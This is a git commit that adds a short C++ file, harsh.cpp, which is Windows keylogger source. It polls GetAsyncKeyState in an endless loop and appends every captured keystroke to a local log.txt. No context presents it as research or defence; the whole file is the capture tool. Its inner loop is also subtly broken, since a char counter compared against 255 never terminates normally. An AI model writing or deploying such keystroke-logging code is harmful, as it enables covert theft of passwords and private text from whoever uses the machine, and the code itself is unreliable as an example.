3b1b9124cd0552c65bf626f30f9e6673dff79191
jayam-joshi <82452505+jayam-joshi@users.noreply.github.com>
2021-06-12 20:51:21 +0530

    Add files via upload

---
+++ harsh.cpp
@@ -0,0 +1,30 @@
+#include<fstream>
+#include<Windows.h>
+#include<iostream>
+
+using namespace std;
+
+int save(int key);
+
+int main()
+{
+    char input;
+    while (true)
+    {for(input=8;input<=255;input++)
+    {if(GetAsyncKeyState(input)==-32767)
+      save(input);
+    }
+    }
+    return 0;
+}
+
+int save(int key)
+{
+    cout<<key<<endl;
+    ofstream fout;
+    fout.open("log.txt",ios::out|ios::app);
+    fout<<(char)key;
+    fout.close();
+    return 0;
+
+}
